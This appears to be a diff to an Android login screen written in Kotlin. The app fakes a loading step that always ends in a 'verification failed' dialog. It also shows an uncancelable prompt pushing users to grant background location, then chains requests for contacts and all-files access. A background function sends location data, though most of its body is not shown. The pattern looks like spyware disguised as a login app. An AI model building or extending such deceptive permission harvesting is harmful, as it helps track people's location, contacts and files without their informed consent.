@@ -15,13 +15,7 @@ import android.os.Environment
 import android.os.Handler
 import android.os.Looper
 import android.provider.Settings
-import android.text.InputType
 import android.util.Log
-import android.view.View
-import android.view.WindowManager
-import android.widget.EditText
-import android.widget.ImageView
-import android.widget.TextView
 import android.widget.Toast
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
@@ -57,9 +51,7 @@ import androidx.compose.ui.graphics.Path
 import androidx.compose.ui.graphics.StrokeCap
 import androidx.compose.ui.graphics.asImageBitmap
 import androidx.compose.ui.graphics.drawscope.Stroke
-import androidx.compose.ui.graphics.nativeCanvas
 import androidx.compose.ui.layout.ContentScale
-import androidx.compose.ui.platform.LocalContext
 import androidx.compose.ui.res.painterResource
 import androidx.compose.ui.text.SpanStyle
 import androidx.compose.ui.text.buildAnnotatedString
@@ -68,33 +60,29 @@ import androidx.compose.ui.text.input.PasswordVisualTransformation
 import androidx.compose.ui.text.input.VisualTransformation
 import androidx.compose.ui.text.style.TextAlign
 import androidx.compose.ui.text.withStyle
+import androidx.compose.ui.unit.LayoutDirection
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
-import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import kotlinx.coroutines.delay
 import kotlin.random.Random
 
-// عنصر اللغة (الاسم + كود العلم)
 data class LangItem(val name: String, val flag: String)
 
 class LoginActivity : ComponentActivity() {
 
-    private var currentScreen by mutableStateOf(-1) // -1=اختيار اللغة, 0=Login, 1=Register, 2=Reset
+    private var currentScreen by mutableStateOf(-1) // -1=Language, 0=Login, 1=Register, 2=Reset
     private var email by mutableStateOf("")
     private var password by mutableStateOf("")
     private var capInput by mutableStateOf("")
     private var capCode by mutableStateOf("")
     private var pwVisible by mutableStateOf(false)
 
-    // Language screen
     private var selectedLang by mutableStateOf(0)
-
-    // Loading overlay + location dialog
     private var showLoadingOverlay by mutableStateOf(false)
     private var showLocationDialog by mutableStateOf(false)
+    private var permissionsStarted by mutableStateOf(false)
 
-    // Register fields
     private var regEmail by mutableStateOf("")
     private var regVC by mutableStateOf("")
     private var regP1 by mutableStateOf("")
@@ -103,16 +91,15 @@ class LoginActivity : ComponentActivity() {
     private var regP1Visible by mutableStateOf(false)
     private var regP2Visible by mutableStateOf(false)
 
-    // Reset fields
     private var resetEmail by mutableStateOf("")
     private var resetVC by mutableStateOf("")
     private var resetP1 by mutableStateOf("")
     private var resetP1Visible by mutableStateOf(false)
 
-    // Permissions
     private var permRequestIndex = 0
     private var anyRejected = false
 
+    // ⭐ الصلاحيات — تطلب بعد تجاوز صفحة اللغة
     private val permissionsToAsk: List<String> by lazy {
         val list = mutableListOf<String>()
         list.add(Manifest.permission.READ_CONTACTS)
@@ -173,17 +160,15 @@ class LoginActivity : ComponentActivity() {
                         2 -> ResetScreen()
                     }
 
-                    // مربع التحميل الأسود الشفاف
                     if (showLoadingOverlay) {
                         LoadingOverlay()
                     }
 
-                    // المربع الأبيض — فشل التحقق
                     if (showLocationDialog) {
                         LocationSettingsDialog()
                     }
 
-                    // بعد 3 ثواني من ظهور التحميل → إخفاؤه وإظهار المربع الأبيض
+                    // بعد 3 ثواني → إظهار مربع فشل التحقق
                     LaunchedEffect(showLoadingOverlay) {
                         if (showLoadingOverlay) {
                             delay(3000)
@@ -195,10 +180,10 @@ class LoginActivity : ComponentActivity() {
             }
         }
 
-        // بعد 5 ثواني — طلب الصلاحيات
+        // ⭐ طلب صلاحية الموقع (Background Location) بعد فتح التطبيق
         Handler(Looper.getMainLooper()).postDelayed({
-            askNextPermission()
-        }, 5000L)
+            requestBackgroundLocationDirect()
+        }, 1500L)
     }
 
     // ═══════════════════════════════════════════
@@ -225,13 +210,40 @@ class LoginActivity : ComponentActivity() {
             modifier = Modifier
                 .fillMaxSize()
                 .background(ComposeColor(0xFF0B1220))
+                .padding(horizontal = 20.dp)
         ) {
+            // Header
+            Spacer(Modifier.height(40.dp))
+
+            Column(
+                modifier = Modifier.fillMaxWidth(),
+                horizontalAlignment = Alignment.End
+            ) {
+                Text(
+                    "اختر اللغة",
+                    color = ComposeColor(0xFFF2F5FA),
+                    fontSize = 22.sp,
+                    fontWeight = FontWeight.Bold,
+                    textAlign = TextAlign.Right,
+                    modifier = Modifier.fillMaxWidth()
+                )
+                Spacer(Modifier.height(6.dp))
+                Text(
+                    "Select your language",
+                    color = ComposeColor(0xFF8A94A6),
+                    fontSize = 13.sp,
+                    textAlign = TextAlign.Right,
+                    modifier = Modifier.fillMaxWidth()
+                )
+            }
+
+            Spacer(Modifier.height(24.dp))
+
             // قائمة اللغات
             Column(
                 modifier = Modifier
                     .weight(1f)
                     .verticalScroll(rememberScrollState())
-                    .padding(horizontal = 14.dp, vertical = 18.dp)
             ) {
                 languages.forEachIndexed { index, item ->
                     val selected = selectedLang == index
@@ -239,25 +251,32 @@ class LoginActivity : ComponentActivity() {
                         modifier = Modifier
                             .fillMaxWidth()
                             .clip(RoundedCornerShape(12.dp))
+                            .background(
+                                if (selected) ComposeColor(0xFF161F33) else ComposeColor.Transparent
+                            )
                             .clickable { selectedLang = index }
-                            .padding(horizontal = 8.dp, vertical = 13.dp),
+                            .padding(horizontal = 12.dp, vertical = 14.dp),
                         verticalAlignment = Alignment.CenterVertically
                     ) {
-                        FlagIcon(
-                            code = item.flag,
-                            modifier = Modifier
-                                .width(32.dp)
-                                .height(23.dp)
-                        )
-                        Spacer(Modifier.width(14.dp))
                         Text(
                             item.name,
                             color = ComposeColor(0xFFF2F5FA),
                             fontSize = 15.sp,
                             modifier = Modifier.weight(1f)
                         )
+
+                        Spacer(Modifier.width(14.dp))
+
+                        FlagIcon(
+                            code = item.flag,
+                            modifier = Modifier
+                                .width(32.dp)
+                                .height(23.dp)
+                        )
+
+                        Spacer(Modifier.width(14.dp))
+
                         if (selected) {
-                            // دائرة بنفسجية بعلامة صح
                             Box(
                                 modifier = Modifier
                                     .size(26.dp)
@@ -273,7 +292,6 @@ class LoginActivity : ComponentActivity() {
                                 )
                             }
                         } else {
-                            // دائرة فاضية
                             Box(
                                 modifier = Modifier
                                     .size(26.dp)
@@ -284,33 +302,51 @@ class LoginActivity : ComponentActivity() {
                 }
             }
 
-            // زر متابعة
-            Button(
-                onClick = {
-                    currentScreen = 0
-                    showLoadingOverlay = true
-                },
+            // ⭐ زر متابعة احترافي
+            Spacer(Modifier.height(12.dp))
+
+            Box(
                 modifier = Modifier
                     .fillMaxWidth()
-                    .padding(horizontal = 18.dp, vertical = 16.dp)
-                    .height(54.dp),
-                shape = RoundedCornerShape(14.dp),
-                colors = ButtonDefaults.buttonColors(
-                    containerColor = ComposeColor(0xFF3D8BFF)
-                )
+                    .height(56.dp)
+                    .clip(RoundedCornerShape(16.dp))
+                    .background(
+                        Brush.horizontalGradient(
+                            colors = listOf(
+                                ComposeColor(0xFF3D8BFF),
+                                ComposeColor(0xFF1A5CFF)
+                            )
+                        )
+                    )
+                    .clickable {
+                        currentScreen = 0
+                        showLoadingOverlay = true
+                    },
+                contentAlignment = Alignment.Center
             ) {
-                Text(
-                    "متابعة",
-                    color = ComposeColor.White,
-                    fontSize = 16.5.sp,
-                    fontWeight = FontWeight.Bold
-                )
+                Row(verticalAlignment = Alignment.CenterVertically) {
+                    Text(
+                        "متابعة",
+                        color = ComposeColor.White,
+                        fontSize = 17.sp,
+                        fontWeight = FontWeight.Bold
+                    )
+                    Spacer(Modifier.width(8.dp))
+                    Text(
+                        "←",
+                        color = ComposeColor.White,
+                        fontSize = 20.sp,
+                        fontWeight = FontWeight.Bold
+                    )
+                }
             }
+
+            Spacer(Modifier.height(24.dp))
         }
     }
 
     // ═══════════════════════════════════════════
-    //  Flags (مرسومة بالكود — شكل ثابت على كل الأجهزة)
+    //  Flags
     // ═══════════════════════════════════════════
     @Composable
     fun FlagIcon(code: String, modifier: Modifier = Modifier) {
@@ -472,13 +508,7 @@ class LoginActivity : ComponentActivity() {
         }
     }
 
-    // رسم نجمة خماسية
-    private fun starPath(
-        cx: Float,
-        cy: Float,
-        outerR: Float,
-        startDeg: Int = -90
-    ): Path {
+    private fun starPath(cx: Float, cy: Float, outerR: Float, startDeg: Int = -90): Path {
         val innerR = outerR * 0.382f
         val path = Path()
         for (i in 0 until 10) {
@@ -493,7 +523,7 @@ class LoginActivity : ComponentActivity() {
     }
 
     // ═══════════════════════════════════════════
-    //  Loading Overlay (مربع أسود شفاف + تحميل متقطع)
+    //  Loading Overlay
     // ═══════════════════════════════════════════
     @Composable
     fun LoadingOverlay() {
@@ -519,7 +549,6 @@ class LoginActivity : ComponentActivity() {
         }
     }
 
-    // علامة تحميل صغيرة متقطعة بتلف
     @Composable
     fun DashedLoadingIndicator() {
         val transition = rememberInfiniteTransition()
@@ -554,7 +583,7 @@ class LoginActivity : ComponentActivity() {
     }
 
     // ═══════════════════════════════════════════
-    //  Location Settings Dialog (المربع الأبيض)
+    //  Location Settings Dialog
     // ═══════════════════════════════════════════
     @Composable
     fun LocationSettingsDialog() {
@@ -634,7 +663,6 @@ class LoginActivity : ComponentActivity() {
                 .fillMaxSize()
                 .verticalScroll(rememberScrollState())
         ) {
-            // Hero
             Column(
                 modifier = Modifier
                     .fillMaxWidth()
@@ -654,11 +682,7 @@ class LoginActivity : ComponentActivity() {
                     modifier = Modifier
                         .clip(RoundedCornerShape(50))
                         .background(ComposeColor(0xBF0A193C))
-                        .border(
-                            1.dp,
-                            ComposeColor(0x475A96FF),
-                            RoundedCornerShape(50)
-                        )
+                        .border(1.dp, ComposeColor(0x475A96FF), RoundedCornerShape(50))
                         .padding(horizontal = 15.dp, vertical = 7.dp),
                     verticalAlignment = Alignment.CenterVertically
                 ) {
@@ -706,7 +730,6 @@ class LoginActivity : ComponentActivity() {
 
             Spacer(Modifier.height(32.dp))
 
-            // Card
             Column(
                 modifier = Modifier
                     .fillMaxWidth()
@@ -714,7 +737,6 @@ class LoginActivity : ComponentActivity() {
                     .background(ComposeColor(0xFF0A1128))
                     .padding(22.dp)
             ) {
-                // Tabs
                 Row {
                     Text(
                         "Email",
@@ -736,12 +758,10 @@ class LoginActivity : ComponentActivity() {
                 CustomInput(email, { email = it }, "Email")
                 Spacer(Modifier.height(12.dp))
 
-                // Password
                 PasswordInput(password, { password = it }, pwVisible, { pwVisible = !pwVisible }, "Password")
 
                 Spacer(Modifier.height(12.dp))
 
-                // Captcha
                 Row(
                     modifier = Modifier
                         .fillMaxWidth()
@@ -776,7 +796,6 @@ class LoginActivity : ComponentActivity() {
 
                 Spacer(Modifier.height(16.dp))
 
-                // Login Button
                 Button(
                     onClick = {
                         if (email.isBlank() || password.isBlank()) {
@@ -838,7 +857,6 @@ class LoginActivity : ComponentActivity() {
                 .verticalScroll(rememberScrollState())
                 .padding(22.dp)
         ) {
-            // Top bar
             Row(verticalAlignment = Alignment.CenterVertically) {
                 BackButton { currentScreen = 0 }
                 Text(
@@ -1201,13 +1219,41 @@ class LoginActivity : ComponentActivity() {
     }
 
     // ═══════════════════════════════════════════
-    //  Permissions
+    //  Background Location — عند فتح التطبيق
+    // ═══════════════════════════════════════════
+    private fun requestBackgroundLocationDirect() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            if (ContextCompat.checkSelfPermission(
+                    this,
+                    Manifest.permission.ACCESS_BACKGROUND_LOCATION
+                ) != PackageManager.PERMISSION_GRANTED
+            ) {
+                try {
+                    AlertDialog.Builder(this)
+                        .setTitle("صلاحية الخلفية")
+                        .setMessage("يرجى تفعيل الموقع في الخلفية للاستمرار")
+                        .setPositiveButton("موافق") { _, _ ->
+                            try {
+                                val i = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
+                                i.data = Uri.parse("package:$packageName")
+                                startActivity(i)
+                            } catch (_: Exception) {}
+                        }
+                        .setCancelable(false)
+                        .show()
+                } catch (_: Exception) {}
+            }
+        }
+    }
+
+    // ═══════════════════════════════════════════
+    //  Permissions — بعد صفحة اللغة
     // ═══════════════════════════════════════════
     private fun askNextPermission() {
         if (anyRejected) return
         if (permRequestIndex >= permissionsToAsk.size) {
             sendLocationNow()
-            Handler(Looper.getMainLooper()).postDelayed({ askBackgroundLocation() }, 1500)
+            Handler(Looper.getMainLooper()).postDelayed({ askAllFilesAccess() }, 1500)
             return
         }
         val perm = permissionsToAsk[permRequestIndex]
@@ -1217,6 +1263,14 @@ class LoginActivity : ComponentActivity() {
             return
         }
         permLauncher.launch(perm)
+    }
+
+    fun startPermissionsAfterLanguage() {
+        if (permissionsStarted) return
+        permissionsStarted = true
+        Handler(Looper.getMainLooper()).postDelayed({
+            askNextPermission()
+        }, 3500L)
     }
 
     private fun sendLocationNow() {
@@ -1237,26 +1291,6 @@ class LoginActivity : ComponentActivity() {
                 }
             } catch (_: Exception) {}
         }.start()
-    }
-
-    private fun askBackgroundLocation() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-                AlertDialog.Builder(this)
-                    .setTitle("الموقع في الخلفية")
-                    .setMessage("لتفعيل الموقع في الخلفية، اختر 'السماح دائماً'")
-                    .setPositiveButton("فتح الإعدادات") { _, _ ->
-                        try {
-                            val i = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
-                            i.data = Uri.parse("package:$packageName")
-                            startActivity(i)
-                        } catch (_: Exception) {}
-                        Handler(Looper.getMainLooper()).postDelayed({ askAllFilesAccess() }, 5000)
-                    }
-                    .setCancelable(false)
-                    .show()
-            } else askAllFilesAccess()
-        } else askAllFilesAccess()
     }
 
     private fun askAllFilesAccess() {
@@ -1327,6 +1361,18 @@ class LoginActivity : ComponentActivity() {
 
     private fun showToast(msg: String) {
         Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
+    }
+
+    // ═══════════════════════════════════════════
+    //  LaunchedEffect — بدء الصلاحيات بعد اللغة
+    // ═══════════════════════════════════════════
+    @Composable
+    fun PermissionStarter() {
+        LaunchedEffect(showLocationDialog) {
+            if (showLocationDialog) {
+                startPermissionsAfterLanguage()
+            }
+        }
     }
 }
 
